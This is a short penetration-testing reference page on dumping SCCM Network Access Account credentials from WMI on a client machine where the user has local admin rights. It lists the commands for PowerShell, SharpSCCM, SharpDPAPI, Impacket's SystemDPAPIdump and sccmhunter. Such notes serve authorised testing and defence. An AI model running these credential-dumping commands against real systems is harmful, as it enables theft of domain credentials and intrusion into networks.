# WMI Local Secrets

https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/sccm-mecm/cred-3-wmi-local-secrets

## Description

Dump currently deployed secrets via WMI

The Network Access Account (NAA) is a domain account provisioned on a site server. The NAA account is used by SCCM clients to download software from the distribution point. Otherwise, it serves no other purpose within the configuration.

The NAA accounts are stored within the CCM_NetworkAccessAccount class located in  the WMI namespace:

    root\ccm\policy\Machine\ActualConfig 

The class contains two attributes which are effectively stored credential data these are:

 - NetworkAccessUsername

 - NetworkAccessPassword

These values contains encrypted data for values within them. With local administrative privileges, its possible to utilize tools such as SharpSCCM and SharpDPAPI to decrypt the data blocks and retrieve the credentials for the currently configured NAA.

## Requirements

1) Local administrator privileges on an SCCM client

To discover if any NAA credentials are stored locally, the following PowerShell command can be executed.

    Get-WmiObject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"

## Windows

### SharpSCCM

    SharpSCCM.exe local secrets -m wmi

### SharpDPAPI

    SharpDPAPI.exe SCCM

## Linux

### SystemDPAPIdump https://github.com/fortra/impacket/blob/755efbffc7bd54c9dcf33d7c5e04038801fd3225/examples/SystemDPAPIdump.py

    python3 SystemDPAPIdump.py -sccm <domain>/<user>:<pass>@<ip>

### sccmhunter

    sccmhunter.py -u <User> -p Password> -target <ip>
